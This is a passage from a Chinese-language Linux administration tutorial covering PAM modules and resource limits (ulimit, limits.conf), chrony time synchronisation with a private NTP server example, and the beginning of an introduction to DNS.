href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018161801212-865140516.png"><img src="2927659-20221018161801212-865140516.png" alt="img"></a></p><h2 id="2-PAM相关文件"><a href="#2-PAM相关文件" class="headerlink" title="2 PAM相关文件"></a>2 PAM相关文件</h2><blockquote><ul><li>包名: pam</li><li>模块文件目录：**/lib64/security/*.so**</li><li>特定模块相关的设置文件：**/etc/security/**</li><li>应用程序调用PAM模块的配置文件<ul><li>主配置文件：**/etc/pam.conf**，默认不存在，一般不使用主配置</li><li>为每种应用模块提供一个专用的配置文件：/etc/pam.d/APP_NAME</li><li>注意：如/etc/pam.d存在，/etc/pam.conf将失效</li></ul></li></ul></blockquote><h2 id="3-PAM工作原理"><a href="#3-PAM工作原理" class="headerlink" title="3 PAM工作原理"></a>3 PAM工作原理</h2><blockquote><p>PAM认证一般遵循这样的顺序：Service(服务)→PAM(配置文件)→pam_*.so</p><p>PAM认证首先要确定那一项服务，然后加载相应的PAM的配置文件(位于/etc/pam.d下)，最后调用认证文件(位于/lib64/security下)进行安全认证</p></blockquote><h4 id="PAM认证过程示例"><a href="#PAM认证过程示例" class="headerlink" title="PAM认证过程示例"></a>PAM认证过程示例</h4><blockquote><ol><li>使用者执行/usr/bin/passwd 程序，并输入密码</li><li>passwd开始调用PAM模块，PAM模块会搜寻passwd程序的PAM相关设置文件，这个设置文件一般是在/etc/pam.d/里边的与程序同名的文件，即PAM会搜寻/etc/pam.d/passwd此设置文件</li><li>经由/etc/pam.d/passwd设定文件的数据，取用PAM所提供的相关模块来进行验证</li><li>将验证结果回传给passwd这个程序，而passwd这个程序会根据PAM回传的结果决定下一个动作（重新输入密码或者通过验证）</li></ol></blockquote><h2 id="4-PAM-配置文件格式说明"><a href="#4-PAM-配置文件格式说明" class="headerlink" title="4 PAM 配置文件格式说明"></a>4 PAM 配置文件格式说明</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#通用配置文件/etc/pam.conf格式,此格式不使用</span><br>application <span class="hljs-built_in">type</span> control module-path arguments<br><br><span class="hljs-comment">#专用配置文件/etc/pam.d/ 格式</span><br><span class="hljs-built_in">type</span> control module-path arguments<br><br>application：指服务名，如：telnet、login、ftp等，服务名字“OTHER”代表所有没有在该文件中明确配置的其它服务<br><span class="hljs-built_in">type</span>：指模块类型，即功能<br>control ：PAM库该如何处理与该服务相关的PAM模块的成功或失败情况，一个关健词实现<br>module-path： 用来指明本模块对应的程序文件的路径名<br>Arguments： 用来传递给该模块的参数<br></code></pre></td></tr></table></figure><blockquote><p><strong>模块类型（<strong><strong>module-type</strong></strong>）</strong></p><ul><li>Auth 账号的认证和授权</li><li>Account 帐户的有效性，与账号管理相关的非认证类的功能，如：用来限制/允许用户对某个服务的访问时间，限制用户的位置(例如：root用户只能从控制台登录)</li><li>Password 用户修改密码时密码复杂度检查机制等功能</li><li>Session 用户会话期间的控制，如：最多打开的文件数，最多的进程数等</li><li>-type 表示因为缺失而不能加载的模块将不记录到系统日志,对于那些不总是安装在系统上的模块有用</li></ul><p><strong>Control</strong></p><ul><li>required ：一票否决，表示本模块必须返回成功才能通过认证，但是如果该模块返回失败，失败结果也不会立即通知用户，而是要等到同一type中的所有模块全部执行完毕，再将失败结果返回给应用程序，即为必要条件</li><li>requisite ：一票否决，该模块必须返回成功才能通过认证，但是一旦该模块返回失败，将不再执行同一type内的任何模块，而是直接将控制权返回给应用程序。是一个必要条件</li><li>sufficient ：一票通过，表明本模块返回成功则通过身份认证的要求，不必再执行同一type内的其它模块，但如果本模块返回失败可忽略，即为充分条件，优先于前面的required和requisite</li><li>optional ：表明本模块是可选的，它的成功与否不会对身份认证起关键作用，其返回值一般被忽略</li><li>include： 调用其他的配置文件中定义的配置信息</li></ul><p><strong>module-path</strong></p><ul><li>模块文件所在绝对路径：</li><li>模块文件所在相对路径：/lib64/security目录下的模块可使用相对路径，如：pam_shells.so、pam_limits.so</li><li>有些模块有自已的专有配置文件，在/etc/security/*.conf目 录下</li></ul><p><strong>Arguments</strong></p><ul><li> debug ：该模块应当用syslog( )将调试信息写入到系统日志文件中</li><li>no_warn ：表明该模块不应把警告信息发送给应用程序</li><li>use_first_pass ：该模块不能提示用户输入密码，只能从前一个模块得到输入密码</li><li>try_first_pass ：该模块首先用前一个模块从用户得到密码，如果该密码验证不通过，再提示用户输入新密码</li><li>use_mapped_pass 该模块不能提示用户输入密码，而是使用映射过的密码</li><li>expose_account 允许该模块显示用户的帐号名等信息，一般只能在安全的环境下使用，因为泄漏用户名会对安全造成一定程度的威胁</li></ul><p>注意：修改PAM配置文件将马上生效</p><p>建议：编辑pam规则时，保持至少打开一个root会话，以防止root身份验证错误</p></blockquote><h2 id="5-PAM模块帮助"><a href="#5-PAM模块帮助" class="headerlink" title="5 PAM模块帮助"></a>5 PAM模块帮助</h2><p><a href="http://www.linux-pam.org/Linux-PAM-html/">官方在线文档</a></p><p><a href="http://www.linux-pam.org/documentation/">官方离线文档</a></p><h2 id="6-常用PAM模块"><a href="#6-常用PAM模块" class="headerlink" title="6 常用PAM模块"></a>6 常用PAM模块</h2><h3 id="6-1-pam-nologin-so-模块"><a href="#6-1-pam-nologin-so-模块" class="headerlink" title="6.1 pam_nologin.so 模块"></a>6.1 pam_nologin.so 模块</h3><p>功能：如果/etc/nologin文件存在,将导致非root用户不能登陆,当该用户登陆时，会显示/etc/nologin文件内容，并拒绝登陆</p><p>范例: 默认此模块可以对ssh等登录有效,但不影响su登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 pam.d]<span class="hljs-comment"># grep pam_nologin *</span><br>cockpit:account    required     pam_nologin.so<br>login:account    required     pam_nologin.so<br>remote:account    required     pam_nologin.so<br>sshd:account    required     pam_nologin.so<br>vmtoolsd:account    required     pam_nologin.so<br></code></pre></td></tr></table></figure><h3 id="6-2-pam-limits-so-模块"><a href="#6-2-pam-limits-so-模块" class="headerlink" title="6.2 pam_limits.so 模块"></a>6.2 pam_limits.so 模块</h3><p>功能：在用户级别实现对其可使用的资源的限制，例如：可打开的文件数量，可运行的进程数量，可用内存空间</p><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018162950225-98900703.png"><img src="2927659-20221018162950225-98900703.png" alt="img"></a></p><p>修改限制的实现方式：</p><h4 id="1-ulimit命令"><a href="#1-ulimit命令" class="headerlink" title="(1) ulimit命令"></a>(1) ulimit命令</h4><p>ulimit是linux shell的内置命令，它具有一套参数集，用于对shell进程及其子进程进行资源限制。</p><p>ulimit的设定值是 per-process 的，也就是说，每个进程有自己的limits值。</p><p>使用ulimit进行修改，立即生效。</p><p>ulimit只影响shell进程及其子进程，用户登出后失效。</p><p>可以在profile中加入ulimit的设置，变相的做到永久生效。</p><blockquote><ul><li>-H 设置硬件资源限制.</li><li>-S 设置软件资源限制.</li><li>-a 显示当前所有的资源限制.</li><li>-c size:设置core文件的最大值.单位:blocks</li><li>-d size:设置数据段的最大值.单位:kbytes</li><li>-f size:设置创建文件的最大值.单位:blocks</li><li>-l size:设置在内存中锁定进程的最大值.单位:kbytes</li><li>-m size:设置可以使用的常驻内存的最大值.单位:kbytes</li><li>-n size:设置内核可以同时打开的文件描述符的最大值.单位:n</li><li>-p size:设置管道缓冲区的最大值.单位:kbytes</li><li>-s size:设置堆栈的最大值.单位:kbytes</li><li>-t size:设置CPU使用时间的最大上限.单位:seconds</li><li>-u size:最大用户进程数</li><li>-v size:设置虚拟内存的最大值.单位:kbytes</li><li>unlimited 是一个特殊值，用于表示不限制</li></ul><p>#说明</p><p>查询时，若不加H或S参数，默认显示的是软限制</p><p>修改时，若不加H或S参数，两个参数一起改变</p></blockquote><h4 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="(2) 配置文件"></a>(2) 配置文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/security/limits.conf<br>/etc/security/limits.d/*.conf<br></code></pre></td></tr></table></figure><h5 id="格式-2"><a href="#格式-2" class="headerlink" title="格式"></a>格式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#每行一个定义</span><br>&lt;domain&gt;       &lt;<span class="hljs-built_in">type</span>&gt; &lt;item&gt; &lt;value&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#应用于哪些对象</span><br>Username 单个用户<br>@group 组内所有用户<br>* 所有用户<br>% 仅用于限制 maxlogins <span class="hljs-built_in">limit</span> , 可以使用 %group 语法. 只用 % 相当于 * 对所有用户<br>maxsyslogins <span class="hljs-built_in">limit</span>限制. %group 表示限制此组中的所有用户总的最大登录数<br><br><span class="hljs-comment">#限制的类型</span><br>Soft 软限制,普通用户自己可以修改<br>Hard 硬限制,由root用户设定，且通过kernel强制生效<br>- 二者同时限定<br><br><span class="hljs-comment">#限制的资源</span><br>nofile 所能够同时打开的最大文件数量,默认为1024<br><span class="hljs-built_in">nproc</span> 所能够同时运行的进程的最大数量,默认为1024<br></code></pre></td></tr></table></figure><p>注意：systemd 的service 资源设置需要单独配置 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># /etc/security/limits.conf</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#This file sets the resource limits for the users logged in via PAM.</span><br><span class="hljs-comment">#It does not affect resource limits of the system services.</span><br>在Centos7以上版本中，使用Systemd替代了之前的SysV。/etc/security/limits.conf文件的配置作<br>用域缩小了。/etc/security/limits.conf的配置，只适用于通过PAM认证登录用户的资源限制，它对<br>systemd的service的资源限制不生效。因此登录用户的限制，通过/etc/security/limits.conf<br>与/etc/security/limits.d下的文件设置即可。<br>对于systemd service的资源设置，则需修改全局配置，全局配置文件放在/etc/systemd/system.conf<br>和/etc/systemd/user.conf，同时也会加载两个对应目录中的所有.conf文<br>件/etc/systemd/system.conf.d/*.conf和/etc/systemd/user.conf.d/*.conf。system.conf<br>是系统实例使用的，user.conf是用户实例使用的。<br>vim /etc/systemd/system.conf<br>DefaultLimitNOFILE=100000<br>DefaultLimitNPROC=65535<br>或者针对指定的service添加下面行<br>[Service]<br>LimitNOFILE=100000<br>LimitNPROC=65535<br></code></pre></td></tr></table></figure><h5 id="案例：系统的各种资源的默认值"><a href="#案例：系统的各种资源的默认值" class="headerlink" title="案例：系统的各种资源的默认值"></a>案例：系统的各种资源的默认值</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 pam.d]<span class="hljs-comment"># ulimit -a</span><br>core file size          (blocks, -c) 0<br>data seg size           (kbytes, -d) unlimited<br>scheduling priority             (-e) 0<br>file size               (blocks, -f) unlimited<br>pending signals                 (-i) 14661<br>max locked memory       (kbytes, -l) 64<br>max memory size         (kbytes, -m) unlimited<br>open files                      (-n) 1024<br>pipe size            (512 bytes, -p) 8<br>POSIX message queues     (bytes, -q) 819200<br>real-time priority              (-r) 0<br>stack size              (kbytes, -s) 8192<br>cpu time               (seconds, -t) unlimited<br>max user processes              (-u) 14661<br>virtual memory          (kbytes, -v) unlimited<br>file locks                      (-x) unlimited<br></code></pre></td></tr></table></figure><h5 id="案例：ulimit-命令修改用户打开的文件个数"><a href="#案例：ulimit-命令修改用户打开的文件个数" class="headerlink" title="案例：ulimit 命令修改用户打开的文件个数"></a>案例：ulimit 命令修改用户打开的文件个数</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 pam.d]<span class="hljs-comment"># ulimit -n</span><br>1024<br>[root@rocky01 pam.d]<span class="hljs-comment"># ulimit -n 1048577</span><br>-bash: <span class="hljs-built_in">ulimit</span>: open files: cannot modify <span class="hljs-built_in">limit</span>: Operation not permitted<br>[root@rocky01 pam.d]<span class="hljs-comment"># ulimit -n 1048576</span><br>[root@rocky01 pam.d]<span class="hljs-comment"># ulimit -n</span><br>1048576<br><br>[root@rocky01 pam.d]<span class="hljs-comment"># echo 2^20|bc</span><br>1048576<br></code></pre></td></tr></table></figure><h5 id="案例：限制用户最多打开的文件数和运行进程数，并持久保存"><a href="#案例：限制用户最多打开的文件数和运行进程数，并持久保存" class="headerlink" title="案例：限制用户最多打开的文件数和运行进程数，并持久保存"></a>案例：限制用户最多打开的文件数和运行进程数，并持久保存</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># cat /etc/pam.d/system-auth |grep pam_limits.so</span><br>session     required      pam_limits.so<br><br>vim /etc/security/limits.conf  <br><span class="hljs-comment">#用户apache可打开10240个文件</span><br>apache  - nofile 10240<br><span class="hljs-comment">#用户student不能运行超过20个进程</span><br>student hard <span class="hljs-built_in">nproc</span> 10<br><span class="hljs-comment">#用student登录多次运行bash，观察结果</span><br>[root@centos8 ~]<span class="hljs-comment">#vim /etc/security/limits.conf </span><br>rye          -     <span class="hljs-built_in">nproc</span>  5<br>rye          -     nofile 666666<br>[rye@rocky01 ~]$ <span class="hljs-built_in">ulimit</span>  -n<br>66666<br></code></pre></td></tr></table></figure><h5 id="生产案例"><a href="#生产案例" class="headerlink" title="生产案例"></a>生产案例</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/security/limits.conf  <br>*    -   core       unlimited<br>*    -   <span class="hljs-built_in">nproc</span>       1000000<br>*    -   nofile      1000000<br>*    -   memlock     32000<br>*    -   msgqueue    8192000<br></code></pre></td></tr></table></figure><h3 id="6-3-pam-google-authenticator-模块"><a href="#6-3-pam-google-authenticator-模块" class="headerlink" title="6.3 pam_google_authenticator 模块"></a>6.3 pam_google_authenticator 模块</h3><p>功能：实现SSH登录的两次身份验证，先验证APP的数字码，再验证root用户的密码，都通过才可以登录。</p><p><a href="https://github.com/google/google-authenticator-android">官方网站</a></p><hr><h1 id="-4"><a href="#-4" class="headerlink" title=""></a></h1><h1 id="六、时间同步服务"><a href="#六、时间同步服务" class="headerlink" title="六、时间同步服务"></a>六、时间同步服务</h1><p>加密和安全当前都离不开时间的同步，否则各种网络服务可能不能正常运行</p><p>范例: 时间错误导致证书应用出错</p><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018164555746-1131565948.png"><img src="2927659-20221018164555746-1131565948.png" alt="img"></a></p><h2 id="1-时间同步服务"><a href="#1-时间同步服务" class="headerlink" title="1 时间同步服务"></a>1 时间同步服务</h2><blockquote><p>多主机协作工作时，各个主机的时间同步很重要，时间不一致会造成很多重要应用的故障，如：加密协议，日志，集群等， 利用<strong>NTP（Network Time Protocol）</strong> 协议使网络中的各个计算机时间达到同步。</p><p><strong>目前NTP协议属于运维基础架构中必备的基本服务之一</strong></p></blockquote><p>时间同步软件实现：</p><ul><li>ntp</li><li>chrony</li></ul><p><strong>ntp：</strong></p><p>将系统时钟和世界协调时UTC同步，精度在局域网内可达0.1ms，在互联网上绝大多数的地方精度可以达到1-50ms</p><p><strong>chrony****：</strong></p><p>实现NTP协议的的自由软件。可使系统时钟与NTP服务器，参考时钟（例如GPS接收器）以及使用手表和键盘的手动输入进行同步。还可以作为NTPv4（RFC 5905）服务器和对等体运行，为网络中的计算机提供时间服务。设计用于在各种条件下良好运行，包括间歇性和高度拥挤的网络连接，温度变化（计算机时钟对温度敏感），以及不能连续运行或在虚拟机上运行的系统。</p><p>通过Internet同步的两台机器之间的典型精度在几毫秒之内，在LAN上，精度通常为几十微秒。利用硬件时间戳或硬件参考时钟，可实现亚微秒的精度</p><h2 id="2-chrony"><a href="#2-chrony" class="headerlink" title="2 chrony"></a>2 chrony</h2><h3 id="2-1-chrony-文件组成"><a href="#2-1-chrony-文件组成" class="headerlink" title="2.1 chrony 文件组成"></a>2.1 chrony 文件组成</h3><blockquote><p>包：chrony</p><p>两个主要程序：chronyd和chronyc</p><ul><li>chronyd：后台运行的守护进程，用于调整内核中运行的系统时钟和时钟服务器同步。它确定计算机增减时间的比率，并对此进行补偿</li><li>chronyc：命令行用户工具，用于监控性能并进行多样化的配置。它可以在chronyd实例控制的计算机上工作，也可在一台不同的远程计算机上工作</li></ul><p>服务unit 文件： /usr/lib/systemd/system/chronyd.service</p><p>监听端口： 服务端: 123/udp,客户端: 323/udp</p><p>配置文件： /etc/chrony.conf</p></blockquote><h3 id="2-2-配置文件chrony-conf"><a href="#2-2-配置文件chrony-conf" class="headerlink" title="2.2 配置文件chrony.conf"></a>2.2 配置文件chrony.conf</h3><blockquote><p><strong>server  #可用于时钟服务器，iburst 选项当服务器可达时</strong>，发送一个八个数据包而不是通常的一个数据包。 包间隔通常为2秒,<strong>可加快初始同步速度</strong></p><p>pool   #该指令的语法与server 指令的语法相似，不同之处在于它用于指定NTP服务器池而不是单个NTP服务器。池名称应解析为随时间可能会变化的多个地址</p><p>driftfile #根据实际时间计算出计算机增减时间的比率，将它记录到一个文件中，会在重启后为系统时钟作出补偿</p><p>rtcsync  #启用内核模式，系统时间每11分钟会拷贝到实时时钟（RTC）</p><p><strong>allow / deny #指定一台主机、子网，或者网络以允许或拒绝访问本服务器</strong></p><p>cmdallow / cmddeny #可以指定哪台主机可以通过chronyd使用控制命令</p><p>bindcmdaddress #允许chronyd监听哪个接口来接收由chronyc执行的命令</p><p>makestep # 通常chronyd将根据需求通过减慢或加速时钟，使得系统逐步纠正所有时间偏差。在某些特定情况下，系统时钟可能会漂移过快，导致该调整过程消耗很长的时间来纠正系统时钟。该指令强制chronyd在调整期大于某个阀值时调整系统时钟</p><p><strong>local stratum 10  #即使server指令中时间服务器不可用，也允许将本地时间作为标准时间授时给其它客户端</strong></p></blockquote><h3 id="2-3-NTP-客户端工具"><a href="#2-3-NTP-客户端工具" class="headerlink" title="2.3 NTP 客户端工具"></a>2.3 NTP 客户端工具</h3><p>chronyc 可以运行在交互式和非交互式两种方式，支持以下子命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span> 命令可以查看更多chronyc的交互命令<br>accheck 检查是否对特定主机可访问当前服务器<br>activity 显示有多少NTP源在线/离线<br>sources [-v]   显示当前时间源的同步信息<br>sourcestats [-v]显示当前时间源的同步统计信息<br>add server 手动添加一台新的NTP服务器<br>clients 报告已访问本服务器的客户端列表<br>delete 手动移除NTP服务器或对等服务器<br>settime 手动设置守护进程时间<br>tracking 显示系统时间信息<br></code></pre></td></tr></table></figure><h3 id="2-4-时间工具"><a href="#2-4-时间工具" class="headerlink" title="2.4 时间工具"></a>2.4 时间工具</h3><p><strong>timedatectl 时间和时区管理</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看日期时间、时区及NTP状态：</span><br>timedatectl<br><br><span class="hljs-comment">#查看时区列表：</span><br>timedatectl list-timezones<br><br><span class="hljs-comment">#修改时区：</span><br>timedatectl set-timezone Asia/Shanghai<br><br><span class="hljs-comment">#修改时区</span><br>root@ubuntu2004:~<span class="hljs-comment"># rm -f /etc/localtime</span><br>root@ubuntu2004:~<span class="hljs-comment"># ln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><br><span class="hljs-comment">#修改日期时间：</span><br>timedatectl set-time <span class="hljs-string">&quot;2017-01-23 10:30:00&quot;</span><br><br><span class="hljs-comment">#开启NTP：</span><br>timedatectl set-ntp <span class="hljs-literal">true</span>/false<br></code></pre></td></tr></table></figure><p><strong>ntpdate 时间同步命令,CentOS8版本此命令已淘汰</strong></p><p><strong>system-config-date：图形化配置chrony服务的工具</strong></p><hr><h3 id="实战案例-实现私有的时间服务器"><a href="#实战案例-实现私有的时间服务器" class="headerlink" title="实战案例: 实现私有的时间服务器"></a>实战案例: 实现私有的时间服务器</h3><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018165556743-1856795570.png"><img src="2927659-20221018165556743-1856795570.png" alt="img"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#服务器端配置</span><br>[root@centos8 ~]<span class="hljs-comment">#hostname -I</span><br>10.0.0.8 <br>[root@centos8 ~]<span class="hljs-comment">#yum -y install chrony</span><br><br>[root@centos8 ~]<span class="hljs-comment">#vim /etc/chrony.conf</span><br>server ntp.aliyun.com iburst<br>server ntp1.aliyun.com iburst<br>server ntp2.aliyun.com iburst<br><br><span class="hljs-comment">#allow 192.168.0.0/16</span><br>allow 0.0.0.0/0  <span class="hljs-comment">#加此行,指定允许同步的网段</span><br><br><span class="hljs-built_in">local</span> stratum 10 <span class="hljs-comment">#删除此行注释,当互联网无法连接,仍然可以为客户端提供时间同步服务</span><br><br>[root@centos8 ~]<span class="hljs-comment">#systemctl restart chronyd</span><br><span class="hljs-comment">#服务启动后会打开端口123/udp</span><br>[root@centos8 ~]<span class="hljs-comment">#ss -ntlu</span><br><br><span class="hljs-comment">#客户端配置</span><br>[root@centos7 ~]<span class="hljs-comment">#vim /etc/chrony.conf</span><br>server 10.0.0.8 iburst<br>[root@centos7 ~]<span class="hljs-comment">#systemctl restart chronyd.service </span><br><span class="hljs-comment">#确认同步成功</span><br>[root@centos7 ~]<span class="hljs-comment">#chronyc sources -vn</span><br></code></pre></td></tr></table></figure><h1 id="一、域名系统-DNS"><a href="#一、域名系统-DNS" class="headerlink" title="一、域名系统 DNS"></a>一、域名系统 DNS</h1><h2 id="1-名字解析介绍和DNS"><a href="#1-名字解析介绍和DNS" class="headerlink" title="1 名字解析介绍和DNS"></a>1 名字解析介绍和DNS</h2><blockquote><p>当前TCP/IP网络中的设备之间进行通信，是利用和依赖于IP地址实现的。但数字形式的IP地址是很难记忆的。当网络设备众多，想要记住每个设备的IP地址，可以说是”不可能完成的任务”。那么如何解决这一难题呢？我们可以给每个网络设备起一个友好的名称，如：<a href="http://www.willoneday.org，这种由文字组成的名称，显而易见要更容易记忆。但是计算机不会理解这种名称的，我们可以**利用一种名字解析服务将名称转化成（解析）成IP地址**。从而我们就可以利用名称来直接访问网络中设备了。除此之外还有一个重要功能，利用名称解析服务可以实现主机和IP的解耦，即：当主机IP变化时，只需要修改名称服务即可，用户仍可以通过原有的名称进行访问而不受影响。">www.willoneday.org，这种由文字组成的名称，显而易见要更容易记忆。但是计算机不会理解这种名称的，我们可以**利用一种名字解析服务将名称转化成（解析）成IP地址**。从而我们就可以利用名称来直接访问网络中设备了。除此之外还有一个重要功能，利用名称解析服务可以实现主机和IP的解耦，即：当主机IP变化时，只需要修改名称服务即可，用户仍可以通过原有的名称进行访问而不受影响。</a></p></blockquote><p>实现此服务的方法是多样的。如下面所述：</p><p>本地名称解析配置文件：hosts</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux: /etc/hosts<br>windows: %WINDIR%/system32/drivers/etc/hosts<br><span class="hljs-comment">#格式</span><br>122.10.117.2 www.willoneday.org. www<br>93.46.8.89   www.google.com. google<br></code></pre></td></tr></table></figure><p>DNS：Domain Name System 域名系统,应用层协议,是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网,基于C/S架构，服务器端：53/udp, 53/tcp</p><p><strong>TCP53端口可以用于数据库的主从同步</strong><br><strong>UDP53端口用于客户端向服务端的查询和数据库的主从同步</strong></p><p>BIND：Bekerley Internet Name Domain,由 ISC （<a href="http://www.isc.org)提供的dns软件实现dns域名结构/">www.isc.org）提供的DNS软件实现DNS域名结构</a></p><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018235908851-2085796555.png"><img src="2927659-20221018235908851-2085796555.png" alt="img"></a></p><blockquote><ul><li>根域: 全球根服务器节点只有13个,10个在美国，1个荷兰，1个瑞典，1个日本</li><li>一级域名：顶级域（Top Level Domain: tld）</li></ul><p>   三类：组织域、国家域(.cn, .ca, .hk, .tw)、反向域</p><p>   com, edu, mil, gov, net, org, int,arpa</p><ul><li>二级域名：willoneday.com</li><li>三级域名：study.willoneday.com</li><li>最多可达到127级域名</li></ul></blockquote><p>ICANN（The Internet Corporation for Assigned Names and Numbers）互联网名称与数字地址分配机构，负责在全球范围内对互联网通用顶级域名（gTLD）以及国家和地区顶级域名（ccTLD）系统的管理、以及根服务器系统的管理</p><hr><h3 id="1-1-DNS服务工作原理"><a href="#1-1-DNS服务工作原理" class="headerlink" title="1.1 DNS服务工作原理"></a>1.1 DNS服务工作原理</h3><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221019001745795-2072836263.png"><img src="2927659-20221019001745795-2072836263.png" alt="img"></a></p><hr><h3 id="1-2-DNS查询类型"><a href="#1-2-DNS查询类型" class="headerlink" title="1.2 DNS查询类型"></a>1.2 DNS查询类型</h3><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221019002027372-1349063876.png"><img src="2927659-20221019002027372-1349063876.png" 